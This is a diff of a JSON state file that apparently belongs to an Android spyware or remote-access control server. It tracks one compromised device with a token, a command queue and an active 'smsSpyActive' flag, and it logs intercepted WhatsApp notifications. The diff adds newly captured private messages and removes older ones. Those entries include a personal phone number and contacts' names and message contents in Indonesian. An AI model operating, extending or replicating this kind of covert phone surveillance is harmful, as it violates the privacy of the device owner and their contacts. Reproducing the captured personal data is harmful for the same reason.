@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003751237,
+    "lastSeen": 1776003754358,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎20 pesan baru",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003756318
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (20 pesan): ~ kv",
+        "content": "typo",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003756243
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎19 pesan baru",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003752485
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (19 pesan): ~ kiwaa inii",
@@ -4099,30 +4123,6 @@
         "time": "12/04 10:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1775963191596
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 813-9113-295",
-        "content": "Maaf aku keluar soalnya leg",
-        "time": "12/04 10:04",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775963079202
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 813-9113-295",
-        "content": "Maaf aku keluar soalnya leg",
-        "time": "12/04 10:04",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775963079018
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mama mamak",
-        "content": "Panggilan telepon berlangsung",
-        "time": "12/04 10:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775962969401
       }
     ],
     "galleryPhotos": [],
